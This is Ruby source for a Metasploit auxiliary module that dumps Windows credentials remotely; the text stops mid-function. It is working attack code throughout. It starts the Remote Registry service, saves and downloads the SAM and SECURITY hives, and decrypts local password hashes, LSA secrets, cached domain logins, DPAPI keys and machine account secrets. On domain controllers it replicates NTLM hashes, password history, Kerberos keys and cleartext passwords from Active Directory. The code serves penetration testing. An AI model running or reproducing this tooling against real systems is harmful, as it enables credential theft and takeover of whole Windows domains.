##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb/dcerpc/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC
  include Msf::Auxiliary::Report
  include Msf::Util::WindowsRegistry
  include Msf::Util::WindowsCryptoHelpers

  # Mapping of MS-SAMR encryption keys to IANA Kerberos Parameter values
  #
  # @see RubySMB::Dcerpc::Samr::KERBEROS_TYPE
  # @see Rex::Proto::Kerberos::Crypto::Encryption
  # rubocop:disable Layout/HashAlignment
  SAMR_KERBEROS_TYPE_TO_IANA = {
    1          => Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_CRC,
    3          => Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_MD5,
    17         => Rex::Proto::Kerberos::Crypto::Encryption::AES128,
    18         => Rex::Proto::Kerberos::Crypto::Encryption::AES256,
    0xffffff74 => Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
  }.freeze
  # rubocop:enable Layout/HashAlignment

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Secrets Dump',
        'Description' => %q{
          Dumps SAM hashes and LSA secrets (including cached creds) from the
          remote Windows target without executing any agent locally. First, it
          reads as much data as possible from the registry and then save the
          hives locally on the target (%SYSTEMROOT%\Temp\random.tmp). Finally, it
          downloads the temporary hive files and reads the rest of the data
          from it. This temporary files are removed when it's done.

          On domain controllers, secrets from Active Directory is extracted
          using [MS-DRDS] DRSGetNCChanges(), replicating the attributes we need
          to get SIDs, NTLM hashes, groups, password history, Kerberos keys and
          other interesting data. Note that the actual `NTDS.dit` file is not
          downloaded. Instead, the Directory Replication Service directly asks
          Active Directory through RPC requests.

          This modules takes care of starting or enabling the Remote Registry
          service if needed. It will restore the service to its original state
          when it's done.

          This is a port of the great Impacket `secretsdump.py` code written by
          Alberto Solino.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Alberto Solino', # Original Impacket code
          'Christophe De La Fuente', # MSf module
        ],
        'References' => [
          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py'],
        ],
        'Notes' => {
          'Reliability' => [],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Actions' => [
          [ 'ALL', { 'Description' => 'Dump everything' } ],
          [ 'SAM', { 'Description' => 'Dump SAM hashes' } ],
          [ 'CACHE', { 'Description' => 'Dump cached hashes' } ],
          [ 'LSA', { 'Description' => 'Dump LSA secrets' } ],
          [ 'DOMAIN', { 'Description' => 'Dump domain secrets (credentials, password history, Kerberos keys, etc.)' } ]
        ],
        'DefaultAction' => 'ALL'
      )
    )

    register_options([ Opt::RPORT(445) ])

    @service_should_be_stopped = false
    @service_should_be_disabled = false
  end

  def enable_registry
    svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')
    svc_status = @svcctl.query_service_status(svc_handle)
    case svc_status.dw_current_state
    when RubySMB::Dcerpc::Svcctl::SERVICE_RUNNING
      print_status('Service RemoteRegistry is already running')
    when RubySMB::Dcerpc::Svcctl::SERVICE_STOPPED
      print_status('Service RemoteRegistry is in stopped state')
      svc_config = @svcctl.query_service_config(svc_handle)
      if svc_config.dw_start_type == RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED
        print_status('Service RemoteRegistry is disabled, enabling it...')
        @svcctl.change_service_config_w(
          svc_handle,
          start_type: RubySMB::Dcerpc::Svcctl::SERVICE_DEMAND_START
        )
        @service_should_be_disabled = true
      end
      print_status('Starting service...')
      @svcctl.start_service_w(svc_handle)
      @service_should_be_stopped = true
    else
      print_error('Unable to get the service RemoteRegistry state')
    end
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def get_boot_key
    print_status('Retrieving target system bootKey')
    root_key_handle = @winreg.open_root_key('HKLM')

    boot_key = ''.b
    ['JD', 'Skew1', 'GBG', 'Data'].each do |key|
      sub_key = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\#{key}"
      vprint_status("Retrieving class info for #{sub_key}")
      subkey_handle = @winreg.open_key(root_key_handle, sub_key)
      query_info_key_response = @winreg.query_info_key(subkey_handle)
      boot_key << query_info_key_response.lp_class.to_s.encode(::Encoding::ASCII_8BIT)
      @winreg.close_key(subkey_handle)
      subkey_handle = nil
    ensure
      @winreg.close_key(subkey_handle) if subkey_handle
    end
    if boot_key.size != 32
      vprint_error("bootKey must be 16-bytes long (hex string of 32 chars), got \"#{boot_key}\" (#{boot_key.size} chars)")
      return ''.b
    end

    transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]
    boot_key = [boot_key].pack('H*')
    boot_key = transforms.map { |i| boot_key[i] }.join
    print_good("bootKey: 0x#{boot_key.unpack('H*')[0]}") unless boot_key&.empty?
    boot_key
  ensure
    @winreg.close_key(root_key_handle) if root_key_handle
  end

  def check_lm_hash_not_stored
    vprint_status('Checking NoLMHash policy')
    res = @winreg.read_registry_key_value('HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa', 'NoLmHash', bind: false)
    if res == 1
      vprint_status('LMHashes are not being stored')
      @lm_hash_not_stored = true
    else
      vprint_status('LMHashes are being stored')
      @lm_hash_not_stored = false
    end
  rescue RubySMB::Dcerpc::Error::WinregError => e
    vprint_warning("An error occured when checking NoLMHash policy: #{e}")
  end

  def save_registry_key(hive_name)
    vprint_status("Create #{hive_name} key")
    root_key_handle = @winreg.open_root_key('HKLM')
    new_key_handle = @winreg.create_key(root_key_handle, hive_name)

    file_name = "#{Rex::Text.rand_text_alphanumeric(8)}.tmp"
    vprint_status("Save key to #{file_name}")
    @winreg.save_key(new_key_handle, "..\\Temp\\#{file_name}")
    file_name
  ensure
    @winreg.close_key(new_key_handle) if new_key_handle
    @winreg.close_key(root_key_handle) if root_key_handle
  end

  def retrieve_hive(hive_name)
    file_name = save_registry_key(hive_name)
    tree2 = simple.client.tree_connect("\\\\#{sock.peerhost}\\ADMIN$")
    file = tree2.open_file(filename: "Temp\\#{file_name}", delete: true, read: true)
    file.read
  ensure
    file.delete if file
    file.close if file
    tree2.disconnect! if tree2
  end

  def save_sam
    print_status('Saving remote SAM database')
    retrieve_hive('SAM')
  end

  def save_security
    print_status('Saving remote SECURITY database')
    retrieve_hive('SECURITY')
  end

  def report_creds(
    user, hash, type: :ntlm_hash, jtr_format: '', realm_key: nil, realm_value: nil
  )
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: type,
      jtr_format: jtr_format,
      username: user
    }.merge(service_data)
    credential_data[:realm_key] = realm_key if realm_key
    credential_data[:realm_value] = realm_value if realm_value

    cl = create_credential_and_login(credential_data)
    cl.respond_to?(:core_id) ? cl.core_id : nil
  end

  def report_info(data, type = '')
    report_note(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: 'smb',
      type: type,
      data: data,
      update: :unique_data
    )
  end

  def dump_sam_hashes(reg_parser, boot_key)
    print_status('Dumping SAM hashes')
    vprint_status('Calculating HashedBootKey from SAM')
    hboot_key = reg_parser.get_hboot_key(boot_key)
    unless hboot_key.present?
      print_warning('Unable to get hbootKey')
      return
    end
    users = reg_parser.get_user_keys
    users.each do |rid, user|
      user[:hashnt], user[:hashlm] = decrypt_user_key(hboot_key, user[:V], rid)
    end

    print_status('Password hints:')
    hint_count = 0
    users.keys.sort { |a, b| a <=> b }.each do |rid|
      # If we have a hint then print it
      next unless !users[rid][:UserPasswordHint].nil? && !users[rid][:UserPasswordHint].empty?

      hint = "#{users[rid][:Name]}: \"#{users[rid][:UserPasswordHint]}\""
      report_info(hint, 'user.password_hint')
      print_line(hint)
      hint_count += 1
    end
    print_line('No users with password hints on this system') if hint_count == 0

    print_status('Password hashes (pwdump format - uid:rid:lmhash:nthash:::):')
    users.keys.sort { |a, b| a <=> b }.each do |rid|
      hash = "#{users[rid][:hashlm].unpack('H*')[0]}:#{users[rid][:hashnt].unpack('H*')[0]}"
      unless report_creds(users[rid][:Name], hash)
        vprint_bad("Error when reporting #{users[rid][:Name]} hash")
      end
      print_line("#{users[rid][:Name]}:#{rid}:#{hash}:::")
    end
  end

  def get_lsa_secret_key(reg_parser, boot_key)
    print_status('Decrypting LSA Key')
    lsa_key = reg_parser.lsa_secret_key(boot_key)

    vprint_good("LSA key: #{lsa_key.unpack('H*')[0]}")

    if reg_parser.lsa_vista_style
      vprint_status('Vista or above system')
    else
      vprint_status('XP or below system')
    end

    return lsa_key
  end

  def get_nlkm_secret_key(reg_parser, lsa_key)
    print_status('Decrypting NL$KM')

    reg_parser.nlkm_secret_key(lsa_key)
  end

  def dump_cached_hashes(reg_parser, nlkm_key)
    print_status('Dumping cached hashes')

    cache_infos = reg_parser.cached_infos(nlkm_key)
    if cache_infos.nil? || cache_infos.empty?
      print_status('No cashed entries')
      return
    end

    hashes = ''
    cache_infos.each do |cache_info|
      vprint_status("Looking into #{cache_info.name}")

      next unless cache_info.entry.user_name_length > 0

      vprint_status("Reg entry: #{cache_info.entry.to_hex}")
      vprint_status("Encrypted data: #{cache_info.entry.enc_data.to_hex}")
      vprint_status("IV:  #{cache_info.entry.iv.to_hex}")

      vprint_status("Decrypted data: #{cache_info.data.to_hex}")

      username = cache_info.data.username.encode(::Encoding::UTF_8)
      info = []
      info << ("Username: #{username}")
      if cache_info.iteration_count
        info << ("Iteration count: #{cache_info.iteration_count} -> real #{cache_info.real_iteration_count}")
      end
      info << ("Last login: #{cache_info.entry.last_access.to_time}")
      dns_domain_name = cache_info.data.dns_domain_name.encode(::Encoding::UTF_8)
      info << ("DNS Domain Name: #{dns_domain_name}")
      info << ("UPN: #{cache_info.data.upn.encode(::Encoding::UTF_8)}")
      info << ("Effective Name: #{cache_info.data.effective_name.encode(::Encoding::UTF_8)}")
      info << ("Full Name: #{cache_info.data.full_name.encode(::Encoding::UTF_8)}")
      info << ("Logon Script: #{cache_info.data.logon_script.encode(::Encoding::UTF_8)}")
      info << ("Profile Path: #{cache_info.data.profile_path.encode(::Encoding::UTF_8)}")
      info << ("Home Directory: #{cache_info.data.home_directory.encode(::Encoding::UTF_8)}")
      info << ("Home Directory Drive: #{cache_info.data.home_directory_drive.encode(::Encoding::UTF_8)}")
      info << ("User ID: #{cache_info.entry.user_id}")
      info << ("Primary Group ID: #{cache_info.entry.primary_group_id}")
      info << ("Additional groups: #{cache_info.data.groups.map(&:relative_id).join(' ')}")
      logon_domain_name = cache_info.data.logon_domain_name.encode(::Encoding::UTF_8)
      info << ("Logon domain name: #{logon_domain_name}")

      report_info(info.join('; '), 'user.cache_info')
      vprint_line(info.join("\n"))

      credential_opts = {
        type: :nonreplayable_hash,
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: logon_domain_name
      }
      if reg_parser.lsa_vista_style
        jtr_hash = "$DCC2$#{cache_info.real_iteration_count}##{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
      else
        jtr_hash = "M$#{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
      end
      credential_opts[:jtr_format] = Metasploit::Framework::Hashes.identify_hash(jtr_hash)
      unless report_creds("#{logon_domain_name}\\#{username}", jtr_hash, **credential_opts)
        vprint_bad("Error when reporting #{logon_domain_name}\\#{username} hash (#{credential_opts[:jtr_format]} format)")
      end
      hashes << "#{logon_domain_name}\\#{username}:#{jtr_hash}\n"
    end

    if hashes.empty?
      print_line('No cached hashes on this system')
    else
      print_status("Hash#{'es' if hashes.lines.size > 1} are in '#{reg_parser.lsa_vista_style ? 'mscash2' : 'mscash'}' format")
      print_line(hashes)
    end
  end

  def get_service_account(service_name)
    return nil unless @svcctl

    vprint_status("Getting #{service_name} service account")
    svc_handle = @svcctl.open_service_w(@scm_handle, service_name)
    svc_config = @svcctl.query_service_config(svc_handle)
    return nil if svc_config.lp_service_start_name == :null

    svc_config.lp_service_start_name.to_s
  rescue RubySMB::Dcerpc::Error::SvcctlError => e
    vprint_warning("An error occured when getting #{service_name} service account: #{e}")
    return nil
  ensure
    @svcctl.close_service_handle(svc_handle) if svc_handle
  end

  def get_default_login_account
    vprint_status('Getting default login account')
    begin
      username = @winreg.read_registry_key_value(
        'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
        'DefaultUserName',
        bind: false
      )
    rescue RubySMB::Dcerpc::Error::WinregError => e
      vprint_warning("An error occured when getting the default user name: #{e}")
      return nil
    end
    return nil if username.nil? || username.empty?

    username = username.encode(::Encoding::UTF_8)

    begin
      domain = @winreg.read_registry_key_value(
        'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
        'DefaultDomainName',
        bind: false
      )
    rescue RubySMB::Dcerpc::Error::WinregError => e
      vprint_warning("An error occurred when getting the default domain name: #{e}")
      domain = ''
    end
    username = "#{domain.encode(::Encoding::UTF_8)}\\#{username}" unless domain.nil? || domain.empty?
    username
  end

  # Returns Kerberos salt for the current connection if we have the correct information
  def get_machine_kerberos_salt
    host = simple.client.default_name
    return ''.b if host.nil? || host.empty?

    domain = simple.client.dns_domain_name
    "#{domain.upcase}host#{host.downcase}.#{domain.downcase}".b
  end

  # @return [Array[Hash{String => String}]]
  def get_machine_kerberos_keys(raw_secret, _machine_name)
    vprint_status('Calculating machine account Kerberos keys')
    # Attempt to create Kerberos keys from machine account (if possible)
    secret = []
    salt = get_machine_kerberos_salt
    if salt.empty?
      vprint_error('Unable to get the salt')
      return []
    end

    raw_secret_utf_16le = raw_secret.dup.force_encoding(::Encoding::UTF_16LE)
    raw_secret_utf8 = raw_secret_utf_16le.encode(::Encoding::UTF_8, invalid: :replace).b

    secret << {
      enctype: Rex::Proto::Kerberos::Crypto::Encryption::AES256,
      key: aes256_cts_hmac_sha1_96(raw_secret_utf8, salt),
      salt: salt
    }

    secret << {
      enctype: Rex::Proto::Kerberos::Crypto::Encryption::AES128,
      key: aes128_cts_hmac_sha1_96(raw_secret_utf8, salt),
      salt: salt
    }

    secret << {
      enctype: Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_MD5,
      key: des_cbc_md5(raw_secret_utf8, salt),
      salt: salt
    }

    secret << {
      enctype: Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC,
      key: OpenSSL::Digest::MD4.digest(raw_secret),
      salt: nil
    }

    secret
  end

  def print_secret(name, secret_item)
    if secret_item.nil? || secret_item.empty?
      vprint_status("Discarding secret #{name}, NULL Data")
      return
    end

    if secret_item.start_with?("\x00\x00".b)
      vprint_status("Discarding secret #{name}, all zeros")
      return
    end

    upper_name = name.upcase
    print_line(name.to_s)

    secret = ''
    if upper_name.start_with?('_SC_')
      # Service name, a password might be there
      # We have to get the account the service runs under
      account = get_service_account(name[4..])
      if account
        secret = "#{account.encode(::Encoding::UTF_8)}:"
      else
        secret = '(Unknown User): '
      end
      secret << secret_item
    elsif upper_name.start_with?('DEFAULTPASSWORD')
      # We have to get the account this password is for
      account = get_default_login_account || '(Unknown User)'
      password = secret_item.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8)
      unless report_creds(account, password, type: :password)
        vprint_bad("Error when reporting #{account} default password")
      end
      secret << "#{account}: #{password}"
    elsif upper_name.start_with?('ASPNET_WP_PASSWORD')
      secret = "ASPNET: #{secret_item}"
    elsif upper_name.start_with?('DPAPI_SYSTEM')
      # Decode the DPAPI Secrets
      machine_key = secret_item[4, 20]
      user_key = secret_item[24, 20]
      report_info(machine_key.unpack('H*')[0], 'dpapi.machine_key')
      report_info(user_key.unpack('H*')[0], 'dpapi.user_key')
      secret = "dpapi_machinekey: 0x#{machine_key.unpack('H*')[0]}\ndpapi_userkey: 0x#{user_key.unpack('H*')[0]}"
    elsif upper_name.start_with?('$MACHINE.ACC')
      md4 = OpenSSL::Digest::MD4.digest(secret_item)
      machine, domain, dns_domain_name = get_machine_name_and_domain_info
      print_name = "#{domain}\\#{machine}$"
      ntlm_hash = "#{Net::NTLM.lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}"
      secret_ary = ["#{print_name}:#{ntlm_hash}:::"]
      credential_opts = {
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: dns_domain_name
      }
      unless report_creds(print_name, ntlm_hash, **credential_opts)
        vprint_bad("Error when reporting #{print_name} NTLM hash")
      end

      raw_passwd = secret_item.unpack('H*')[0]
      credential_opts[:type] = :password
      unless report_creds(print_name, raw_passwd, **credential_opts)
        vprint_bad("Error when reporting #{print_name} raw password hash")
      end
      secret = "#{print_name}:plain_password_hex:#{raw_passwd}\n"

      machine_kerberos_keys = get_machine_kerberos_keys(secret_item, print_name)
      if machine_kerberos_keys.empty?
        vprint_status('Could not calculate machine account Kerberos keys')
      else
        credential_opts[:type] = :krb_enc_key
        machine_kerberos_keys.each do |key|
          key_data = Metasploit::Credential::KrbEncKey.build_data(**key)
          unless report_creds(print_name, key_data, **credential_opts)
            vprint_bad("Error when reporting #{print_name} machine kerberos key #{krb_enc_key_to_s(key)}")
          end
        end
      end

      secret << machine_kerberos_keys.map { |key| "#{print_name}:#{krb_enc_key_to_s(key)}" }.concat(secret_ary).join("\n")
    end

    if secret.empty?
      print_line(Rex::Text.to_hex_dump(secret_item).strip)
      print_line("Hex string: #{secret_item.unpack('H*')[0]}")
    else
      print_line(secret)
    end
    print_line
  end

  def dump_lsa_secrets(reg_parser, lsa_key)
    print_status('Dumping LSA Secrets')

    lsa_secrets = reg_parser.lsa_secrets(lsa_key)
    lsa_secrets.each do |key, secret|
      print_secret(key, secret)
    end
  end

  def get_machine_name_and_domain_info
    if simple.client&.default_name.blank?
      begin
        vprint_status('Getting Server Info')
        wkssvc = @tree.open_file(filename: 'wkssvc', write: true, read: true)

        vprint_status('Binding to \\wkssvc...')
        wkssvc.bind(endpoint: RubySMB::Dcerpc::Wkssvc)
        vprint_status('Bound to \\wkssvc')

        info = wkssvc.netr_wksta_get_info
      rescue RubySMB::Error::RubySMBError => e
        print_error("Error when connecting to 'wkssvc' interface ([#{e.class}] #{e}).")
        return
      end
      return [info[:wki100_computername].encode('utf-8'), info[:wki100_langroup].encode('utf-8'), datastore['SMBDomain']]
    end
    [simple.client.default_name, simple.client.default_domain, simple.client.dns_domain_name]
  end

  def connect_samr(domain_name)
    vprint_status('Connecting to Security Account Manager (SAM) Remote Protocol')
    @samr = @tree.open_file(filename: 'samr', write: true, read: true)

    vprint_status('Binding to \\samr...')
    @samr.bind(endpoint: RubySMB::Dcerpc::Samr)
    vprint_good('Bound to \\samr')

    @server_handle = @samr.samr_connect
    @domain_sid = @samr.samr_lookup_domain(server_handle: @server_handle, name: domain_name)
    @domain_handle = @samr.samr_open_domain(server_handle: @server_handle, domain_id: @domain_sid)

    builtin_domain_sid = @samr.samr_lookup_domain(server_handle: @server_handle, name: 'Builtin')
    @builtin_domain_handle = @samr.samr_open_domain(server_handle: @server_handle, domain_id: builtin_domain_sid)
  end

  def get_domain_users
    users = @samr.samr_enumerate_users_in_domain(domain_handle: @domain_handle)
    vprint_status("Obtained #{users.length} domain users, fetching the SID for each...")
    progress_interval = 250
    nb_digits = (Math.log10(users.length) + 1).floor
    users = users.each_with_index.map do |(rid, name), index|
      if index % progress_interval == 0
        percent = format('%.2f', (index / users.length.to_f * 100)).rjust(5)
        print_status("SID enumeration progress - #{index.to_s.rjust(nb_digits)} / #{users.length} (#{percent}%)")
      end
      sid = @samr.samr_rid_to_sid(object_handle: @domain_handle, rid: rid)
      [sid.to_s, name.to_s]
    end
    print_status("SID enumeration progress - #{users.length} / #{users.length} (  100%)")
    users
  rescue RubySMB::Error::RubySMBError => e
    print_error("Error when enumerating domain users ([#{e.class}] #{e}).")
    return
  end

  def get_user_groups(sid)
    user_handle = nil
    rid = sid.split('-').last.to_i

    user_handle = @samr.samr_open_user(domain_handle: @domain_handle, user_id: rid)
    groups = @samr.samr_get_group_for_user(user_handle: user_handle)
    groups = groups.map do |group|
      RubySMB::Dcerpc::Samr::RpcSid.new("#{@domain_sid}-#{group.relative_id.to_i}")
    end

    alias_groups = @samr.samr_get_alias_membership(domain_handle: @domain_handle, sids: groups + [sid])
    alias_groups = alias_groups.map do |group|
      RubySMB::Dcerpc::Samr::RpcSid.new("#{@domain_sid}-#{group}")
    end

    builtin_alias_groups = @samr.samr_get_alias_membership(domain_handle: @builtin_domain_handle, sids: groups + [sid])
    builtin_alias_groups = builtin_alias_groups.map do |group|
      RubySMB::Dcerpc::Samr::RpcSid.new("#{@domain_sid}-#{group}")
    end
    groups + alias_groups + builtin_alias_groups
  ensure
    @samr.close_handle(user_handle) if user_handle
  end

  def connect_drs
    dcerpc_client = RubySMB::Dcerpc::Client.new(
      rhost,
      RubySMB::Dcerpc::Drsr,
      username: datastore['SMBUser'],
      password: datastore['SMBPass']
    )

    dcerpc_client.connect
    vprint_status('Binding to DRSR...')
    dcerpc_client.bind(
      endpoint: RubySMB::Dcerpc::Drsr,
      auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
      auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
    )
    vprint_status('Bound to DRSR')

    dcerpc_client
  rescue ::Rex::Proto::DCERPC::Exceptions::Error, ArgumentError => e
    print_error("Unable to bind to the directory replication remote service (DRS): #{e}")
    return
  end

  def decrypt_supplemental_info(dcerpc_client, result, attribute_value)
    result[:kerberos_keys] = []
    result[:clear_text_passwords] = {}
    plain_text = dcerpc_client.decrypt_attribute_value(attribute_value)
    user_properties = RubySMB::Dcerpc::Samr::UserProperties.read(plain_text)
    user_properties.user_properties.each do |user_property|
      case user_property.property_name.encode('utf-8')
      when 'Primary:Kerberos-Newer-Keys'
        value = user_property.property_value
        binary_value = value.chars.each_slice(2).map { |a, b| (a + b).hex.chr }.join
        kerb_stored_credential_new = RubySMB::Dcerpc::Samr::KerbStoredCredentialNew.read(binary_value)
        key_values = kerb_stored_credential_new.get_key_values
        kerb_stored_credential_new.credentials.each_with_index do |credential, i|
          # Extract the kerberos keys, note that the enctype here is a RubySMB::Dcerpc::Samr::KERBEROS_TYPE
          # not the IANA Kerberos value, which is required for database persistence
          result[:kerberos_keys] << {
            enctype: credential.key_type.to_i,
            key: key_values[i]
          }
        end
      when 'Primary:CLEARTEXT'
        # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
        # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.
        begin
          result[:clear_text_passwords] << user_property.property_value.to_s.force_encoding('utf-16le').encode('utf-8')
        rescue EncodingError
          # This could be because we're decoding a machine password. Printing it hex
          # Keep clear_text_passwords with a ASCII-8BIT encoding
          result[:clear_text_passwords] << user_property.property_value.to_s
        end
      end
    end
  end

  def parse_user_record(dcerpc_client, user_record)
    vprint_status("Decrypting hash for user: #{user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')}")

    entinf_struct = user_record.pmsg_out.msg_getchg.p_objects.entinf
    rid = entinf_struct.p_name.sid[-4..].unpack('L<').first
    dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')

    result = {
      dn: dn,
      rid: rid,
      object_sid: rid,
      lm_hash: Net::NTLM.lm_hash(''),
      nt_hash: Net::NTLM.ntlm_hash(''),
      disabled: nil,
      pwd_last_set: nil,
      last_logon: nil,
      expires: nil,
      computer_account: nil,
      password_never_expires: nil,
      password_not_required: nil,
      lm_history: [],
      nt_history: [],
      domain_name: '',
      username: 'unknown',
      admin: false,
      domain_admin: false,
      enterprise_admin: false
    }

    entinf_struct.attr_block.p_attr.each do |attr|
      next unless attr.attr_val.val_count > 0

      att_id = user_record.pmsg_out.msg_getchg.oid_from_attid(attr.attr_typ)
      lookup_table = RubySMB::Dcerpc::Drsr::ATTRTYP_TO_ATTID

      attribute_value = attr.attr_val.p_aval[0].p_val.to_ary.map(&:chr).join
      case att_id
      when lookup_table['dBCSPwd']
        encrypted_lm_hash = dcerpc_client.decrypt_attribute_value(attribute_value)
        result[:lm_hash] = dcerpc_client.remove_des_layer(encrypted_lm_hash, rid)
      when lookup_table['unicodePwd']
        encrypted_nt_hash = dcerpc_client.decrypt_attribute_value(attribute_value)
        result[:nt_hash] = dcerpc_client.remove_des_layer(encrypted_nt_hash, rid)
      when lookup_table['userPrincipalName']
        result[:domain_name] = attribute_value.force_encoding('utf-16le').split('@'.encode('utf-16le')).last.encode('utf-8')
      when lookup_table['sAMAccountName']
        result[:username] = attribute_value.force_encoding('utf-16le').encode('utf-8')
      when lookup_table['objectSid']
        result[:object_sid] = attribute_value
      when lookup_table['userAccountControl']
        user_account_control = attribute_value.unpack('L<')[0]
        result[:disabled] = user_account_control & RubySMB::Dcerpc::Samr::UF_ACCOUNTDISABLE != 0
        result[:computer_account] = user_account_control & RubySMB::Dcerpc::Samr::UF_NORMAL_ACCOUNT == 0
        result[:password_never_expires] = user_account_control & RubySMB::Dcerpc::Samr::UF_DONT_EXPIRE_PASSWD != 0
        result[:password_not_required] = user_account_control & RubySMB::Dcerpc::Samr::UF_PASSWD_NOTREQD != 0
      when lookup_table['pwdLastSet']
        result[:pwd_last_set] = Time.at(0)
        time_value = attribute_value.unpack('Q<')[0]
        if time_value > 0
          result[:pwd_last_set] = RubySMB::Field::FileTime.new(time_value).to_time.utc
        end
      when lookup_table['lastLogonTimestamp']
        result[:last_logon] = Time.at(0)
        time_value = attribute_value.unpack('Q<')[0]
        if time_value > 0
          result[:last_logon] = RubySMB::Field::FileTime.new(time_value).to_time.utc
        end
      when lookup_table['accountExpires']
        result[:expires] = Time.at(0)
        time_value = attribute_value.unpack('Q<')[0]
        if time_value > 0 && time_value != 0x7FFFFFFFFFFFFFFF
          result[:expires] = RubySMB::Field::FileTime.new(time_value).to_time.utc
        end
      when lookup_table['lmPwdHistory']
        tmp_lm_history = dcerpc_client.decrypt_attribute_value(attribute_value)
        tmp_lm_history.bytes.each_slice(16) do |block|
          result[:lm_history] << dcerpc_client.remove_des_layer(block.map(&:chr).join, rid)
        end
      when lookup_table['ntPwdHistory']
        tmp_nt_history = dcerpc_client.decrypt_attribute_value(attribute_value)
        tmp_nt_history.bytes.each_slice(16) do |block|
          result[:nt_history] << dcerpc_client.remove_des_layer(block.map(&:chr).join, rid)
        end
      when lookup_table['supplementalCredentials']
        decrypt_supplemental_info(dcerpc_client, result, attribute_value)
      end
    end

    result
  end

  def dump_ntds_hashes
    _machine_name, domain_name, dns_domain_name = get_machine_name_and_domain_info
    return unless domain_name

    print_status('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
    print_status('Using the DRSUAPI method to get NTDS.DIT secrets')

    begin
      connect_samr(domain_name)
    rescue RubySMB::Error::RubySMBError => e
      print_error(
        "Unable to connect to the remote Security Account Manager (SAM) ([#{e.class}] #{e}). "\
        'Is the remote server a Domain Controller?'
      )
      return
    end
    users = get_domain_users

    dcerpc_client = connect_drs
    ph_drs = dcerpc_client.drs_bind
    dc_infos = dcerpc_client.drs_domain_controller_info(ph_drs, domain_name)
    user_info = {}
    dc_infos.each do |dc_info|
      users.each do |sid, _name|
        crack_names = dcerpc_client.drs_crack_names(ph_drs, rp_names: [sid])
        crack_names.each do |crack_name|
          user_record = dcerpc_client.drs_get_nc_changes(
            ph_drs,
            nc_guid: crack_name.p_name.to_s.encode('utf-8'),
            dsa_object_guid: dc_info.ntds_dsa_object_guid
          )
          user_info[sid] = parse_user_record(dcerpc_client, user_record)
        end

        groups = get_user_groups(sid)
        groups.each do |group|
          case group.name
          when 'BUILTIN\\Administrators'
            user_info[sid][:admin] = true
          when '(domain)\\Domain Admins'
            user_info[sid][:domain_admin] = true
          when '(domain)\\Enterprise Admins'
            user_info[sid][:enterprise_admin] = true
          end
        end
      end
    end

    credential_opts = {
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: dns_domain_name
    }

    print_line('# SID\'s:')
    user_info.each do |sid, info|
      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
      print_line("#{full_name}: #{sid}")
    end

    print_line("\n# NTLM hashes:")
    user_info.each do |_sid, info|
      hash = "#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}"
      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
      unless report_creds(full_name, hash, **credential_opts)
        vprint_bad("Error when reporting #{full_name} hash")
      end
      print_line("#{full_name}:#{info[:rid]}:#{hash}:::")
    end

    print_line("\n# Full pwdump format:")
    user_info.each do |sid, info|
      hash = "#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}"
      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
      pwdump = "#{full_name}:#{info[:rid]}:#{hash}:"
      extra_info = "Disabled=#{info[:disabled].nil? ? 'N/A' : info[:disabled]},"
      extra_info << "Expired=#{!info[:disabled] && info[:expires] && info[:expires] > Time.at(0) && info[:expires] < Time.now},"
      extra_info << "PasswordNeverExpires=#{info[:password_never_expires].nil? ? 'N/A' : info[:password_never_expires]},"
      extra_info << "PasswordNotRequired=#{info[:password_not_required].nil? ? 'N/A' : info[:password_not_required]},"
      extra_info << "PasswordLastChanged=#{info[:pwd_last_set] && info[:pwd_last_set] > Time.at(0) ? info[:pwd_last_set].strftime('%Y%m%d%H%M') : 'never'},"
